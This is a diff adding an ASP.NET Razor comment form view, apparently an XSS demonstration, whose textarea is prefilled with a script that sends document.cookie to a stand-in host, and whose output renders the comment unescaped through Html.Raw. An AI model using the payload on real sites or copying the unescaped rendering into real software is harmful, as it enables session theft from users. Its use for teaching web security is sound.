@@ -1,0 +1,21 @@
+﻿
+@{
+    ViewData["Title"] = "CommentAdd";
+}
+
+<h1>CommentAdd</h1>
+
+<form method="post">
+    <input name="name" class="form-control" />
+    <br />
+    <textarea name="comment" class="form-control">
+"<script>new Image().src = 'http://www.example.com/cookieReady?cookie=' + document.cookie</script>"
+</textarea>
+    <br />
+    <input type="submit" value="Send" />
+</form>
+<h1>Yorumlar</h1>
+<hr />
+<strong>@ViewBag.name</strong>
+<hr />
+<strong>@Html.Raw(ViewBag.comment)</strong>
